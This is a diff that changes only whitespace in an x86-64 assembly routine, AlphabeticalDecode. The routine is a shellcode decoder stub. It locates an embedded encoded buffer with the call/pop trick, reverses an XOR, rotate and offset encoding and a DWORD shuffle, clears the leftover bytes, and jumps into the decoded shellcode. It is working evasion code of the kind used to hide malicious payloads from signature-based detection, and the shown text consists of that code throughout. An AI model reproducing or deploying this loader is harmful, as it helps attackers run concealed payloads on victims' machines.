@@ -8,85 +8,85 @@ AlphabeticalDecode:
     push    rdi
     push    rbp
     mov     rbp, rsp
-    
-    ; Get pointer to buffer 
+
+    ; Get pointer to buffer
     ; use call/pop technique for position independence
     call    .get_buffer_addr
 
 .get_buffer_addr:
     pop     rsi                                         ; RSI = address of this instruction
     add     rsi, (EncodedBuffer - .get_buffer_addr)     ; Adjust to point to buffer
-    
-    ; Static size matching the buffer  
-    mov     ebx, BUFFER_SIZE        
-    
+
+    ; Static size matching the buffer
+    mov     ebx, BUFFER_SIZE
+
     ; Calculate number of WORDs to process
     mov     edi, ebx
     shr     edi, 1                  ; edi = encoded_size / 2
-    
+
     ; Initialize loop counter
     xor     ecx, ecx                ; ecx = 0 (loop counter)
-    
+
 .DecodeLoop:
     cmp     ecx, edi                ; Compare i with decoded_size
     jae     .DecodeComplete
-    
+
     ; Load WORD from encoded shellcode
-    movzx   eax, word [rsi + rcx*2]  
-    
+    movzx   eax, word [rsi + rcx*2]
+
     ; Extract bTransformed (lower byte) and bOffset (upper byte)
     mov     r8b, al                 ; r8b = bTransformed
     shr     eax, 8                  ; Shift to get upper byte
     mov     r9b, al                 ; r9b = bOffset
-    
+
     ; Reverse the encoding operations
     xor     r8b, XOR_KEY            ; XOR with constant
     ror     r8b, 4                  ; Rotate right by 4
     sub     r8b, r9b                ; Subtract offset
-    
+
     ; Store decoded byte in-place
     mov     byte [rsi + rcx], r8b   ; Store at index i
-    
+
     inc     ecx                     ; i++
     jmp     short .DecodeLoop
-    
+
 .DecodeComplete:
     ; Reverse the DWORD shuffle
     mov     eax, edi                ; eax = decoded size (in bytes)
     and     eax, 0FFFFFFFCh         ; Round down to nearest multiple of 4
     shr     eax, 2                  ; Divide by 4 to get DWORD count
-    
+
     xor     ecx, ecx                ; i = 0
-    
+
 .ShuffleLoop:
-    cmp     ecx, eax                
+    cmp     ecx, eax
     jae     .ShuffleComplete
-    
+
     ; Load DWORD from the decoded portion
     mov     edx, dword [rsi + rcx*4]
-    
+
     ; Swap upper and lower WORD
     rol     edx, 16                 ; Rotate left by 16
-    
+
     ; Store back
     mov     dword [rsi + rcx*4], edx
-    
+
     inc     ecx                     ; i++
     jmp     short .ShuffleLoop
-    
+
 .ShuffleComplete:
-    ; Clear the unused portion of the buffer 
+    ; Clear the unused portion of the buffer
     ; EDI still contains the decoded size
     push    rdi                     ; Save decoded size
     push    rsi                     ; Save buffer pointer
-    
+
     ; Calculate start of unused portion
     mov     rax, rsi                ; Buffer start
     add     rax, rdi                ; Add decoded size to get start of unused portion
-    
+
     ; Calculate size to clear (encoded_size - decoded_size = decoded_size)
     mov     rcx, rdi                ; Size to clear = decoded_size
-    
+
     ; Clear the unused bytes
     xor     rdx, rdx                ; Zero to write
 .ClearLoop:
@@ -96,22 +96,22 @@ AlphabeticalDecode:
     inc     rax                     ; Next byte
     dec     rcx                     ; Decrement counter
     jmp     short .ClearLoop
-    
+
 .ClearComplete:
     pop     rsi                     ; Restore buffer pointer
     pop     rdi                     ; Restore decoded size
-    
+
     ; Restore registers
     mov     rsp, rbp
     pop     rbp
     pop     rdi
-    
+
     ; Save the decoded buffer pointer
     mov     rax, rsi
-    
+
     pop     rsi
     pop     rbx
-    
+
     ; Jump to decoded shellcode
     jmp     rax
 
